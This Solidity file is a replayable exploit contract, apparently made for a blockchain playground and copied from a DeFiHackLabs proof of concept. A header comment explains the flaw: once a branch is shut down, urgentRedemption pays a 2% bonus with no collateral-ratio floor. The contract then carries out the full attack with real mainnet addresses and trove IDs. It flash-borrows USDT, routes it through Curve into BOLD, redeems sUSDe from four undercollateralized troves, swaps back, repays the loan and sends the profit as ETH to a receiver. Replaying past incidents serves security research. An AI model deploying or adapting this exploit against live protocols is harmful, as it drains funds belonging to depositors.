// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-07-ActivePoolUrgentRedemption).
// The DeFiHackLabs PoC already defines a standalone attack contract
// (ActivePoolUrgentRedemptionAttack) in the test file, but the test deploys a copy
// and then vm.etch's it onto a specific historical address (HISTORICAL_EXECUTOR)
// purely to match the historical attack tx byte-for-byte. The dumped fork state
// shows that address has zero balance, zero nonce, and no code/storage of its own
// (i.e. it carries no precondition the attack depends on), so this synthetic
// version is a verbatim copy of the original attack contract, deployed fresh by
// the playground's normal (non-etch) deploy path.
//
// Root cause: once the sUSDe TroveManager branch is shut down, the permissionless
// urgentRedemption() path pays a 2% collateral bonus with no ICR >= 100% floor,
// letting anyone burn BOLD for undercollateralized-trove collateral worth more
// than the BOLD surrendered. The attacker flash-borrowed USDT, routed it to BOLD
// via two Curve pools, redeemed sUSDe collateral from four selected troves at the
// bonus rate, swapped the sUSDe back to USDT on Fluid DEX, repaid the flash loan,
// and converted the USDT surplus to WETH/ETH via Uniswap V3.

address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant USDT_TOKEN = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant CURVE_USDT_BOLD_POOL = 0x4f493B7dE8aAC7d55F71853688b1F7C8F0243C85;
address constant CURVE_BOLD_POOL = 0x95591348FE9718bE8bfa3afcC9b017D9Ec18A7fa;
address constant TROVE_MANAGER = 0x9dc845b500853F17E238C36Ba120400dBEa1D02A;
address constant BOLD = 0x85E30b8b263bC64d94b827ed450F2EdFEE8579dA;
address constant SUSDE = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497;
address constant FLUID_DEX = 0x1DD125C32e4B5086c63CC13B3cA02C4A2a61Fa9b;
address constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

uint256 constant FLASH_USDT_AMOUNT = 108_500_000_000;
uint256 constant HISTORICAL_SWAP_DEADLINE = 1_751_499_807;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IMorphoFlashLoan1379 {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IUSDT1379 {
    function approve(address spender, uint256 amount) external;
}

interface ICurveAddLiquidity1379 {
    function add_liquidity(uint256[] calldata amounts, uint256 minMintAmount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy, address receiver) external returns (uint256);
}

interface ITroveManager1379 {
    function urgentRedemption(uint256 boldAmount, uint256[] calldata troveIds, uint256 minCollateral) external;
}

interface IFluidDex1379 {
    function swapIn(bool swap0to1, uint256 amountIn, uint256 amountOutMin, address to)
        external
        payable
        returns (uint256 amountOut);
}

interface IUniswapV3Router1379 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

interface IWETH1379 {
    function withdraw(
        uint256 amount
    ) external;
}

contract ActivePoolUrgentRedemptionAttack {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    receive() external payable {}

    function execute() external {
        IMorphoFlashLoan1379(MORPHO).flashLoan(USDT_TOKEN, FLASH_USDT_AMOUNT, "");
        payable(profitReceiver).transfer(address(this).balance);
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata) external {
        require(msg.sender == MORPHO, "only Morpho");
        require(amount == FLASH_USDT_AMOUNT, "amount");

        IUSDT1379(USDT_TOKEN).approve(CURVE_USDT_BOLD_POOL, amount);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0;
        amounts[1] = amount;
        uint256 curveLp = ICurveAddLiquidity1379(CURVE_USDT_BOLD_POOL).add_liquidity(amounts, 0);

        IERC20(CURVE_USDT_BOLD_POOL).approve(CURVE_BOLD_POOL, curveLp);
        uint256 boldAmount = ICurveAddLiquidity1379(CURVE_BOLD_POOL).exchange(1, 0, curveLp, 0, address(this));

        IERC20(BOLD).approve(TROVE_MANAGER, boldAmount);
        uint256[] memory troveIds = new uint256[](4);
        troveIds[0] = 0x91b57cad558db9c86b9bb2ab54fde0b0a30d2c5c11f71ccb1b935897ef693dd2;
        troveIds[1] = 0x588866c16ec669c32dcfb231addd64ef8ce4165ee5565870207dc018c72dd8d3;
        troveIds[2] = 0x59bad19ede340d132118d499542b78b735be45649749eac55c6fe7b6bcc331b1;
        troveIds[3] = 0x5d2487f861a7fab7a16427de3316c3c563f50ad28cf8fc083330d8871dcd3ffd;
        ITroveManager1379(TROVE_MANAGER).urgentRedemption(boldAmount, troveIds, 0);

        uint256 susdeBalance = IERC20(SUSDE).balanceOf(address(this));
        IERC20(SUSDE).approve(FLUID_DEX, susdeBalance);
        IFluidDex1379(FLUID_DEX).swapIn(true, susdeBalance, 1, address(this));

        uint256 usdtSurplus = IERC20(USDT_TOKEN).balanceOf(address(this)) - FLASH_USDT_AMOUNT;
        IUSDT1379(USDT_TOKEN).approve(UNISWAP_V3_ROUTER, usdtSurplus);
        IUniswapV3Router1379(UNISWAP_V3_ROUTER).exactInputSingle(
            IUniswapV3Router1379.ExactInputSingleParams({
                tokenIn: USDT_TOKEN,
                tokenOut: WETH_TOKEN,
                fee: 3000,
                recipient: address(this),
                deadline: HISTORICAL_SWAP_DEADLINE,
                amountIn: usdtSurplus,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        uint256 wethBalance = IERC20(WETH_TOKEN).balanceOf(address(this));
        IWETH1379(WETH_TOKEN).withdraw(wethBalance);

        IUSDT1379(USDT_TOKEN).approve(MORPHO, FLASH_USDT_AMOUNT);
    }
}
